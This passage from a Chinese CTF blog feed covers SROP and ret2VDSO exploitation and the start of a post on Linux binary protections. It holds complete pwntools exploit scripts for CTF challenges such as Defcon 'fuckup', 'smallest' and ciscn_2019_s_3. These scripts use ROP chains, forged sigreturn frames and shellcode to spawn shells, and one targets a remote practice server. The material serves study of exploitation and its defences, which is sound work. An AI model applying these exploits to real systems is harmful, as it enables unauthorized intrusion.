bin_sh_addrframe.rip = syscall_addrpayload = &#39;A&#39; * 8 + p64(set_sigreturn) + p64(syscall_ret) + str(frame)raw_input(&#39;@&#39;)p.send(payload)p.interactive()</code></pre><h1 id="fuckup"><a href="#fuckup" class="headerlink" title="fuckup"></a>fuckup</h1><p>2015 Defcon Quals 中这道题可以使用 ret2VDSO 和 SROP。具体没能复现出来，主要理解一下思想。</p><pre><code class="bash">$ checksec ./fuckup[*] &#39;/home/beale/Desktop/2015-Defcon-Quals-fuckup/fuckup&#39;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>总共有五个选项，选项 2 会修改程序段和栈的基址，并重新指向新的地址；选项 3 会告诉我们当前的随机数并再次随机化程序段；选项 4 中可以进行溢出：</p><pre><code class="bash">$ ./fuckupWelcome to Fully Unguessable Convoluted Kinetogenic Userspace Pseudoransomization, the new and improved ASLR.This app is to help prove the benefits of F.U.C.K.U.P.Main Menu---------1. Display info2. Change random3. View state info4. Test stack smash-------0. Quit</code></pre><p>在选项 2 的代码反编译后可以看到，每次用户执行命令时，程序会根据类似于 WELL512 的生成算法生成的随机数，改变二进制映射的存储器的基址：</p><pre><code class="cpp">int sub_80481A6(){  ...  do  {    seed_1 = WELL512() * 4294967295.0;    seed_2 = (signed __int64)seed_1;    addy = (void *)(seed_2 &amp; 0xFFFFF000);    actual = my_mmap(seed_2 &amp; 0xFFFFF000, 28672, 3, 34, -1, 0, v0, v0);  }  while ( (seed_2 &amp; 0xFFFFF000) != actual );  qmemcpy(addy, dword_804EB40, 0x7000u);  my_mprotect(addy, 0x4000u, 5);  ...}</code></pre><p>普通的思路肯定是做不了的。使用 VDSO 的思路大致如下：</p><ul><li>因为 32 位下 VDSO 只有 1 字节是随机的，可以暴力破解</li><li>直接溢出改返回地址，但只有 100 个字节<ul><li>首先先利用 VDSO 的 Gadget 做出 sys_read 并加大输入的大小</li><li>将读入的内容放到 TLS（TLS 的位置在 VDSO 前一页）</li><li>使用 sysenter 将栈转移到 TLS 段</li><li>在第二次输入的时候将 /bin/sh 放到 TLS 段（这个时候栈已经搬到 TLS 了）</li></ul></li><li>接着把 Sigreturn Gadget 以及 Fake Signal Frame 一并放进，然后可以直接 execve 执行 /bin/sh</li><li>循环直到成功 get shell</li></ul><p>还可以通过 z3 对伪随机数进行预测，脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *from z3 import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;state = [BitVec(&quot;a1_{0}&quot;.format(i), 32) for i in range(16)]def m(x):    return p32(x + offset)def well512(index):    idx = (index+15) &amp; 15    a = state[index]    c = state[(index+13) &amp; 15]    b = a ^ c ^ ((a &lt;&lt; 16) &amp; 0xffffffff) ^ ((c &lt;&lt; 15) &amp; 0xffffffff)    c = state[(index+9) &amp; 15]    c ^= (c &gt;&gt; 11)    state[(index+10) &amp; 15] = c ^ b    a = state[idx]    d = ((32 * (c ^ b)) &amp; 0xDA442D24) ^ c ^ b    state[idx] = a ^ b ^ d ^ ((a &lt;&lt; 2) &amp; 0xffffffff) ^ (        (b &lt;&lt; 18) &amp; 0xffffffff) ^ ((c &lt;&lt; 28) &amp; 0xffffffff)    return idxdef well512_z3(index):    idx = (index+15) &amp; 15    a = state[index]    c = state[(index+13) &amp; 15]    b = a ^ c ^ (a &lt;&lt; 16) ^ (c &lt;&lt; 15)    c = state[(index+9) &amp; 15]    c ^= LShR(c, 11)    a = state[idx]    state[(index+10) &amp; 15] = b ^ c    d = ((32 * (c ^ b)) &amp; 0xDA442D24) ^ c ^ b    a = state[idx]    state[idx] = a ^ b ^ d ^ (a &lt;&lt; 2) ^ (b &lt;&lt; 18) ^ (c &lt;&lt; 28)    return idxdef find_state(recv):    info(&#39;Start find state.&#39;)    global state    z = Solver()    idx = 15    for r in recv:        idx = well512_z3(idx)        z.add(state[idx] == r + 1)    return zp = process(&#39;./fuckup&#39;)def choice(c):    p.recvuntil(&#39;Quit\n&#39;)    p.sendline(str(c))r_list = []for i in range(15):    choice(3)    sleep(0.1)    r = int(p.recv(0x20)[0x11:0x19], 16)    r_list.append(r)info(r_list)z = find_state(r_list)info(&#39;Solver result =&gt; &#39; + str(z.check()))next_state = dict()model = z.model()for i in model:    idx = int(str(i)[3:])    val = model[i].as_long()    next_state[idx] = valinfo(next_state)for i in range(16):    if i in next_state:        state[i] = next_state[i]idx = 15for i in range(15):    idx = well512(idx)idx = well512(idx)predict_val = state[idx] - 1info(&#39;predict_val = &#39; + hex(predict_val))current_base = 0xfffff000 &amp; predict_valinfo(&#39;current_base = &#39; + hex(current_base))base = 0x8048000offset = current_base - base# 0x0804908f : pop eax ; pop ebx ; pop esi ; retpop_eax_ebx_esi_ret = 0x0804908f# 0x0804961a : pop edx ; pop ecx ; pop ebx ; retpop_edx_ecx_ebx_ret = 0x0804961a# 0x0804875f : int 0x80int_0x80 = 0x0804875fpayload = &#39;A&#39; * 0x16payload += m(pop_eax_ebx_esi_ret)payload += p32(0x7D)payload += p32(0)payload += p32(0)payload += m(pop_edx_ecx_ebx_ret)payload += p32(0x7)payload += p32(0x1000)payload += p32(current_base)payload += m(int_0x80)payload += m(pop_eax_ebx_esi_ret)payload += p32(0x3)payload += p32(0)payload += p32(0)payload += m(pop_edx_ecx_ebx_ret)payload += p32(0x100)payload += p32(current_base)payload += p32(0)payload += m(int_0x80)payload += p32(current_base)payload = payload.ljust(100, &#39;A&#39;)payload += asm(shellcraft.sh())p.sendline(&#39;4&#39;)p.sendline(payload)p.interactive()</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso</a><br><a href="http://adam8157.info/blog/2011/10/linux-vdso/" target="_blank" rel="noopener">http://adam8157.info/blog/2011/10/linux-vdso/</a><br><a href="https://bestwing.me/stack-overflow-three-SROP.html" target="_blank" rel="noopener">https://bestwing.me/stack-overflow-three-SROP.html</a><br><a href="https://www.anquanke.com/post/id/85810" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85810</a><br><a href="https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/" target="_blank" rel="noopener">https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/</a><br><a href="https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html" target="_blank" rel="noopener">https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html</a><br><a href="https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/" target="_blank" rel="noopener">https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/</a><br><a href="https://pwnexpoit.tistory.com/13" target="_blank" rel="noopener">https://pwnexpoit.tistory.com/13</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用 SROP 的时候，一般情况下很难找得到 &lt;code&gt;syscall ; ret&lt;/code&gt;，这时就需要在 VDSO 中找了。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Understanding SigReturn-Oriented-Programming</title>
    <link href="blog.b3ale.cn/2020/03/13/Understanding-SigReturn-Oriented-Programming/"/>
    <id>blog.b3ale.cn/2020/03/13/Understanding-SigReturn-Oriented-Programming/</id>
    <published>2020-03-13T08:07:27.000Z</published>
    <updated>2020-03-19T15:53:21.513Z</updated>
    
    <content type="html"><![CDATA[<p>去年学 ROP 的时候遗漏的一个技术。</p><a id="more"></a><h1 id="What-is-SROP"><a href="#What-is-SROP" class="headerlink" title="What is SROP"></a>What is SROP</h1><p>SROP（Sigreturn Oriented Programming）于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究 Framing Signals — A Return to Portable Shellcode 发表在安全顶级会议 Oakland 2014 上，被评选为当年的 Best Student Papers。</p><p>其中，Sigreturn 是一个系统调用，在类 Unix 系统发生 Signal 的时候会被间接地调用。</p><h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>Signal 机制是类 Unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="/pics/Understanding-SigReturn-Oriented-Programming/1.png" srcset="/img/loading.gif" alt></p><ol><li>首先内核向某个用户态进程发送 Signal 时，该进程会被暂时挂起并进入内核态；</li><li>内核会为该进程保存上下文（类似于保存函数现场，将所有寄存器压入栈，以及压入 Signal 的信息和指向 Sigreturn 的系统调用地址），存储完毕后，回到用户态；</li><li>接着使用用户态中注册过的 Signal Handler 处理相应的 Signal；</li><li>处理完毕后回到内核态，内核执行 Sigreturn 系统调用（32 位的调用号为 77，64 位的调用号为 15），将对应进程的上下文恢复，最后回到用户态。</li></ol><p>在保存进程上下文的时候，用户态的栈中的结构如下。其中 ucontext 以及 siginfo 这一段被称为 Signal Frame，在 Signal Handler 执行完之后，就会执行 Sigreturn 代码：</p><p><img src="/pics/Understanding-SigReturn-Oriented-Programming/2.png" srcset="/img/loading.gif" alt></p><p>Signal Frame 在不同架构下不同。在 x86 中的 sigcontext 结构体如下：</p><pre><code class="cpp">struct sigcontext {    __u16                gs, __gsh;    __u16                fs, __fsh;    __u16                es, __esh;    __u16                ds, __dsh;    __u32                edi;    __u32                esi;    __u32                ebp;    __u32                esp;    __u32                ebx;    __u32                edx;    __u32                ecx;    __u32                eax;    __u32                trapno;    __u32                err;    __u32                eip;    __u16                cs, __csh;    __u32                eflags;    __u32                esp_at_signal;    __u16                ss, __ssh;    struct _fpstate __user        *fpstate; // FPU寄存器状态    __u32                oldmask;    __u32                cr2;};</code></pre><p>在 x64 中的 sigcontext 结构体如下：</p><pre><code class="cpp">struct sigcontext {    __u64                r8;    __u64                r9;    __u64                r10;    __u64                r11;    __u64                r12;    __u64                r13;    __u64                r14;    __u64                r15;    __u64                rdi;    __u64                rsi;    __u64                rbp;    __u64                rbx;    __u64                rdx;    __u64                rax;    __u64                rcx;    __u64                rsp;    __u64                rip;    __u64                eflags;        /* RFLAGS */    __u16                cs;    __u16                gs;    __u16                fs;    __u16                __pad0;    __u64                err;    __u64                trapno;    __u64                oldmask;    __u64                cr2;    struct _fpstate __user        *fpstate;    /* Zero when no FPU context */    __u64                reserved1[8];};</code></pre><h2 id="SROP-Theory"><a href="#SROP-Theory" class="headerlink" title="SROP Theory"></a>SROP Theory</h2><p>在 Signal 机制的整个过程中，内核所做的主要工作就是为进程保存上下文以及恢复上下文。所改变的 Signal Frame 是处在用户的地址空间中的，所以可以得出一下结论：</p><ul><li>Signal Frame 可以被用户读写；</li><li>因为内核没有直接参与 Signal，所以内核并不知道保存的 Signal Frame 是否是真正的进程上下文（即执行 Sigreturn 的时候）。</li></ul><p>那么就可以构造出假的 Signal Frame，提前把 RDI、RSI、RIP 等寄存器的值放在构造的结构体中，执行完 Sigreturn 后就会给各个寄存器设置好值。构造 SROP 的条件如下：</p><ul><li>可以通过栈溢出来控制栈</li><li>需要知道一些地址<ul><li><code>&amp;&quot;/bin/sh&quot;</code></li><li>Signal Frame</li><li>Gadget：<code>syscall ; ret</code></li><li>Sigreturn</li></ul></li><li>需要有足够大的空间来放下 Signal Frame</li></ul><p>在 pwntools 中也集成了 SROP 的工具，即 <code>SigreturnFrame()</code>，用于构造假的 sigcontext 结构体（Signal Frame）。</p><h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>我们可以自行构造一个程序，使用 SROP 进行一个简单的利用：</p><pre><code class="cpp">char buf[0x200];int main(){    asm(        // 读取 0x200 字节        &quot;mov rax, 0\n&quot; // sys_read        &quot;mov rdi, 0\n&quot; // fd        &quot;lea rsi, %0\n&quot; // buf        &quot;mov rdx, 0x200\n&quot; // count        &quot;syscall\n&quot;        // 恢复进程上下文        &quot;mov rax, 15\n&quot; // sys_rt_sigaction        &quot;mov rdi, 0\n&quot;        &quot;mov rsp, rsi\n&quot; // 把buf作为栈        // syscall 的 symbol，便于查找        &quot;syscall:\n&quot;        &quot;syscall\n&quot;        &quot;jmp exit\n&quot;        // 退出程序        &quot;exit:\n&quot;        &quot;mov rax, 60\n&quot; // sys_exit        &quot;mov rdi, 0\n&quot;        &quot;syscall\n&quot;        :        : &quot;m&quot; (buf)        :        );}</code></pre><p>构造出 Signal Frame，并在 buf 上设置好字符串，发送 payload 后拿到 shell：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;p = process(&#39;./main&#39;)elf = ELF(&#39;./main&#39;)#gdb.attach(p)# 构造假的Signal Frameframe = SigreturnFrame()frame.rax = constants.SYS_execve # 设置系统调用号为sys_execveframe.rdi = elf.symbols[&#39;buf&#39;] + 0x100 # 设置第一个参数为偏移0x100处的“/bin/sh”字符串frame.rsi = 0frame.rdx = 0frame.rip = elf.symbols[&#39;syscall&#39;]payload = str(frame).ljust(0x100, &#39;A&#39;) + &#39;/bin/sh\x00&#39; # 设置payloadp.send(payload)p.interactive()</code></pre><p>调试的时候可以看到 Sigreturn 后各个寄存器被设置的值，然后就能调用 execve 的系统调用了：</p><pre><code class="gdb">──────────────────────────────────── Code ────────────────────────────────────   0x40010a &lt;main+34&gt;:    mov    rax,0xf   0x400111 &lt;main+41&gt;:    mov    rdi,0x0   0x400118 &lt;main+48&gt;:    mov    rsp,rsi=&gt; 0x40011b &lt;main+51&gt;:    syscall   0x40011d &lt;main+53&gt;:    jmp    0x40011f &lt;main+55&gt;   0x40011f &lt;main+55&gt;:    mov    rax,0x3c   0x400126 &lt;main+62&gt;:    mov    rdi,0x0   0x40012d &lt;main+69&gt;:    syscall────────────────────────────── System call info ──────────────────────────────rt_sigreturn()───────────────────────────────── SROP info ──────────────────────────────────       ss_size:0x0000000000000000           rsi:0x0000000000000000           rax:0x000000000000003b           rbp:0x0000000000000000        eflags:0x0000000000000000           rcx:0x0000000000000000           rip:0x000000000040011b           r13:0x0000000000000000           cr2:0x0000000000000000           r12:0x0000000000000000           rbx:0x0000000000000000       uc_link:0x0000000000000000           err:0x0000000000000000        trapno:0x0000000000000000           r10:0x0000000000000000      ss_flags:0x0000000000000000         ss_sp:0x0000000000000000           rdi:0x0000000000600280      uc_flags:0x0000000000000000           r14:0x0000000000000000            r8:0x0000000000000000      selector:0x0000000000000033            r9:0x0000000000000000           rdx:0x0000000000000000           rsp:0x0000000000000000       oldmask:0x0000000000000000           r11:0x0000000000000000           r15:0x0000000000000000...──────────────────────────────────── Code ────────────────────────────────────   0x40010a &lt;main+34&gt;:    mov    rax,0xf   0x400111 &lt;main+41&gt;:    mov    rdi,0x0   0x400118 &lt;main+48&gt;:    mov    rsp,rsi=&gt; 0x40011b &lt;main+51&gt;:    syscall   0x40011d &lt;main+53&gt;:    jmp    0x40011f &lt;main+55&gt;   0x40011f &lt;main+55&gt;:    mov    rax,0x3c   0x400126 &lt;main+62&gt;:    mov    rdi,0x0   0x40012d &lt;main+69&gt;:    syscall────────────────────────────── System call info ──────────────────────────────execve(const char *name = 0x600280,const char *const *argv = 0x0,const char *const *envp = 0x0)const char *name : 0x600280 --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)const char *const *argv : 0x0const char *const *envp : 0x0</code></pre><h1 id="Smallest"><a href="#Smallest" class="headerlink" title="Smallest"></a>Smallest</h1><p>程序只开了 NX，Got 表可写、没有 Canary 保护、没开 PIE：</p><pre><code class="bash">$ checksec ./smallest[*] &#39;/home/beale/SROP/2017-360Chunqiu-Smallest/smallest&#39;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>2017 年 360 春秋杯的 Smallest 可以用 SROP 实现利用。程序由汇编实现，整体只有几条语句：</p><pre><code class="bash">$ objdump -d ./smallest -M intel./smallest:     file format elf64-x86-64Disassembly of section .text:00000000004000b0 &lt;.text&gt;:  4000b0:    48 31 c0                 xor    rax,rax  4000b3:    ba 00 04 00 00           mov    edx,0x400  4000b8:    48 89 e6                 mov    rsi,rsp  4000bb:    48 89 c7                 mov    rdi,rax  4000be:    0f 05                    syscall  4000c0:    c3                       ret</code></pre><p>可以看到 <code>4000be</code> 处的是 <code>syscall ; ret</code>，可以作为利用。而整个程序，是实现了一个 read 的系统调用，总共读 0x400 个字节到栈上。利用方法是先泄露出一个栈上的地址，然后通过 SROP 构造一个 read 调用往这个已知的地址上写数据，并再次利用 SROP 构造一个 execve 的调用；第二种方法是使用 mprotect 将不可执行的栈改为 rwx，然后执行 shellcode。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>脚本如下：</p><pre><code class="python">#!/usr/bin/env python#-*- encoding=utf-8 -*-from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]p = process(&#39;./smallest&#39;)elf = ELF(&#39;./smallest&#39;)#gdb.attach(p)main_addr = 0x4000b0syscall_addr = 0x4000bepayload = p64(main_addr) * 3 # 栈上放3个main的地址，第1个main用来修改rax，第2个main用来泄漏栈，第3个main为了之后的输入raw_input(&#39;@main*3&#39;)p.send(payload)payload = &#39;\xb3&#39; # 修改第2个main的地址为0x4000b3，同时可以将rax和rdi设置为1，可以泄漏栈的地址raw_input(&#39;@leak stack&#39;)p.send(payload)p.recv(8)stack_addr = u64(p.recv(8))info(&#39;stack_addr = &#39; + hex(stack_addr))payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturnframe = SigreturnFrame()frame.rax = constants.SYS_read # sys_read的调用号frame.rdi = 0frame.rsi = stack_addrframe.rdx = 0x400frame.rsp = stack_addrframe.rip = syscall_addrpayload += str(frame) # 读0x400个字节到新的栈上，并把栈搬到新的栈上raw_input(&#39;@fake sigcontext to pivot stack&#39;)p.send(payload)payload = p64(syscall_addr).ljust(15, &#39;A&#39;) # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）raw_input(&#39;@set rax=15&#39;)p.send(payload)# 下面开始往新的栈上写东西bin_sh_addr = stack_addr + 2 * 8 + len(SigreturnFrame()) # 设置“/bin/sh”字符串的地址payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturnframe = SigreturnFrame()frame.rax = constants.SYS_execve # sys_execve的调用号frame.rdi = bin_sh_addrframe.rip = syscall_addrpayload += str(frame) + &#39;/bin/sh\x00&#39; # 开shellraw_input(&#39;@fake sigcontext to exec shell&#39;)p.send(payload)payload = p64(syscall_addr).ljust(15, &#39;A&#39;) # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）raw_input(&#39;@set rax=15&#39;)p.send(payload)p.interactive()</code></pre><p>第二种方法即在新的栈上写东西时构造出 mprotect 的调用，并添加 shellcode：</p><pre><code class="python">payload = p64(main_addr) + p64(syscall_addr)frame = SigreturnFrame()frame.rax = constants.SYS_mprotectframe.rdi = stack_addr &amp; 0xfffffffffffff000frame.rsi = 0x1000frame.rdx = 0x7frame.rsp = stack_addr + 0x108 # 设置栈的位置frame.rip = syscall_addrpayload += str(frame)payload += p64(stack_addr + 0x110) # 设置return的地址payload += asm(shellcraft.sh())p.send(payload)</code></pre><h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>保护和上面开的一样：</p><pre><code class="bash">$ checksec ./ciscn_s_3[*] &#39;/root/tmp/ciscn_2019_s_3/ciscn_s_3&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p>程序在 main 中调用了 vuln：</p><pre><code class="asm">000000000040051d &lt;main&gt;:  40051d:    55                       push   rbp  40051e:    48 89 e5                 mov    rbp,rsp  400521:    48 83 ec 10              sub    rsp,0x10  400525:    89 7d fc                 mov    DWORD PTR [rbp-0x4],edi  400528:    48 89 75 f0              mov    QWORD PTR [rbp-0x10],rsi  40052c:    b8 00 00 00 00           mov    eax,0x0  400531:    e8 b7 ff ff ff           call   4004ed &lt;vuln&gt;  400536:    90                       nop  400537:    c9                       leave  400538:    c3                       ret</code></pre><p>vuln 中读了 0x400 到 <code>[rsp-0x10]</code> 处，并输出 0x30 个字节。读了这么多有足够的空间进行 SROP：</p><pre><code class="asm">00000000004004ed &lt;vuln&gt;:  4004ed:    55                       push   rbp  4004ee:    48 89 e5                 mov    rbp,rsp  4004f1:    48 31 c0                 xor    rax,rax  4004f4:    ba 00 04 00 00           mov    edx,0x400  4004f9:    48 8d 74 24 f0           lea    rsi,[rsp-0x10]  4004fe:    48 89 c7                 mov    rdi,rax  400501:    0f 05                    syscall  400503:    48 c7 c0 01 00 00 00     mov    rax,0x1  40050a:    ba 30 00 00 00           mov    edx,0x30  40050f:    48 8d 74 24 f0           lea    rsi,[rsp-0x10]  400514:    48 89 c7                 mov    rdi,rax  400517:    0f 05                    syscall  400519:    c3                       ret  40051a:    90                       nop  40051b:    5d                       pop    rbp  40051c:    c3                       ret</code></pre><p>另外还提供了 sys_execve 和 sys_sigreturn 的调用号：</p><pre><code class="asm">00000000004004d6 &lt;gadgets&gt;:  4004d6:    55                       push   rbp  4004d7:    48 89 e5                 mov    rbp,rsp  4004da:    48 c7 c0 0f 00 00 00     mov    rax,0xf  4004e1:    c3                       ret  4004e2:    48 c7 c0 3b 00 00 00     mov    rax,0x3b  4004e9:    c3                       ret  4004ea:    90                       nop  4004eb:    5d                       pop    rbp  4004ec:    c3                       ret</code></pre><p>这题相对简单一些，可以写 <code>&quot;/bin/sh&quot;</code> 到栈上，然后通过 write 的输出计算出地址，最后直接调 SROP。</p><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><p>脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]local = 0if local:  p = process(&#39;./ciscn_s_3&#39;)else:    p = remote(&#39;node3.buuoj.cn&#39;, 28526)#gdb.attach(p)vuln_addr = 0x4004f1set_sigreturn_addr = 0x4004daset_execve_addr = 0x4004e2syscall_ret = 0x400517payload = &#39;/bin/sh\x00&#39;.ljust(16, &#39;A&#39;) + p64(vuln_addr)raw_input(&#39;@&#39;)p.send(payload)p.recv(32)stack_addr = u64(p.recv(8))info(&#39;stack_addr = &#39; + hex(stack_addr))bin_sh_addr = stack_addr - 0x118payload = p64(set_sigreturn_addr) + p64(syscall_ret)frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = bin_sh_addrframe.rip = syscall_retpayload += str(frame)raw_input(&#39;@&#39;)p.send(payload)p.interactive()</code></pre><h1 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h1><h2 id="Gadgets-Prevention"><a href="#Gadgets-Prevention" class="headerlink" title="Gadgets Prevention"></a>Gadgets Prevention</h2><p>在当前的几种不同的操作系统中，<code>sigreturn</code> 和 <code>syscall; ret</code> 这两个 Gadgets 非常容易被找到，特别是在 <code>vsyscall</code> 这种特别不安全的机制存在的情况下。因此我们应该尽量避免这种机制，让 ASLR 等保护机制物尽其用，使得攻击者很难找到这些 Gadgets。但是这种方法并不能从本质上解决 SROP 的问题。</p><h2 id="Signal-Frame-Canaries"><a href="#Signal-Frame-Canaries" class="headerlink" title="Signal Frame Canaries"></a>Signal Frame Canaries</h2><p>这种方法借鉴于 Stack Canaries 机制，即在<code>Signal Frame</code>的<code>rt_sigreturn</code>字段之前插入一段随机生成的字节，如果发生 Overflow，则该段字节会被破坏，从而在发生<code>sigreturn</code>之前会被检测到。同时针对 Stack Canaries 的攻击也很多，其同样不能从本质上防止 SROP 的发生。</p><h2 id="Break-kernel-agnostic"><a href="#Break-kernel-agnostic" class="headerlink" title="Break kernel agnostic"></a>Break kernel agnostic</h2><p>这就要追溯到 SROP 的本质问题了，就是内核对 Signal 的不可知性。如果我们在内核处理 <code>sigreturn</code> 系统调用的时候判断一下当前的 Signal Frame 是否是由内核之前创建的，那么这个问题就能从根本上解决。当然，这就涉及到要修改内核的一些底层的设计了，可能也会引入一些新的问题。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop</a><br><a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h</a><br><a href="https://bestwing.me/stack-overflow-three-SROP.html" target="_blank" rel="noopener">https://bestwing.me/stack-overflow-three-SROP.html</a><br><a href="http://blog.leanote.com/post/3191220142@qq.com/SROP" target="_blank" rel="noopener">http://blog.leanote.com/post/3191220142@qq.com/SROP</a><br><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/87447.html</a><br><a href="http://blog.eonew.cn/archives/975" target="_blank" rel="noopener">http://blog.eonew.cn/archives/975</a><br><a href="https://bestwing.me/2017-360chunqiu-online.html" target="_blank" rel="noopener">https://bestwing.me/2017-360chunqiu-online.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去年学 ROP 的时候遗漏的一个技术。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux下的各类程序保护机制</title>
    <link href="blog.b3ale.cn/2020/03/06/Linux%E4%B8%8B%E7%9A%84%E5%90%84%E7%B1%BB%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <id>blog.b3ale.cn/2020/03/06/Linux%E4%B8%8B%E7%9A%84%E5%90%84%E7%B1%BB%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</id>
    <published>2020-03-06T10:59:35.000Z</published>
    <updated>2020-03-20T02:07:20.057Z</updated>
    
    <content type="html"><![CDATA[<p>之前一直在做逆向，快一年没碰 PWN 了，接下来有一堆比赛，赶紧重新 PWN 起来。这里先整理一下 Linux 下的程序保护机制。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Linux 版本：</p><pre><code class="bash">$ uname -aLinux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</code></pre><p>GCC 版本：</p><pre><code class="bash">$ gcc --versiongcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609Copyright (C) 2015 Free Software Foundation, Inc.This is free software; see the source for copying conditions.  There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</code></pre><h1 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h1><p><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="noopener">Checksec</a> 是用 Shell 编写的一个脚本，它可以用来检查可执行文件属性，例如 PIE, RELRO, PaX, Canaries, ASLR, Fortify Source 等等属性。</p><p><img src="/pics/Linux下的各类程序保护机制/1.png" srcset="/img/loading.gif" alt></p><h1 id="Cannary"><a href="#Cannary" class="headerlink" title="Cannary"></a>Cannary</h1><p>Canary 表示栈保护功能是否开启。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 Shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入 Cookie 信息，当函数真正返回的时候会验证 Cookie 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 Cookie 信息给覆盖掉，导致栈保护检查失败而阻止 Shellcode 的执行。在 Linux 中将 Cookie 信息称为 Canary。</p><p>gcc 在 4.2 版本中添加了 <code>-fstack-protector</code> 和 <code>-fstack-protector-all</code> 编译参数以支持栈保护功能，4.9 新增了 <code>-fstack-protector-strong</code> 编译参数让保护的范围更广。故在编译时可以控制是否开启栈保护以及程度。</p><p>测试代码：</p><pre><code class="cpp">#include &lt;stdio.h&gt;int main() {    char buf[20];    gets(buf);    return 0;}</code></pre><h2 id="Default（-fstack-protector）"><a href="#Default（-fstack-protector）" class="headerlink" 